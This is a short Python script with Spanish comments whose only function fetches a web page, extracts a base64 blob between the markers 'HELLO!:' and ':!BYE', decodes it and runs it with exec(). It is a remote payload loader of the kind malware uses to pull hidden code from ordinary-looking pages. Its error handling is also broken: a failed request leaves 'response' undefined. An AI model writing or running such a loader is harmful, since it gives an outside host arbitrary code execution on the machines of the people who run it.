import requests
import base64
import os
import socket

def executePayload(URL):
    try:
        response = requests.get(URL, timeout=5)

    except requests.exceptions.RequestException as e:
        print(f"Error al recuperar el payload: {e}")

    partes = response.text.split("HELLO!:")
    partes = partes[1].split(":!BYE")
    payload_b64 = partes[0]
    payload = base64.b64decode(payload_b64).decode('utf-8')  # exec() necesita texto
    exec(payload)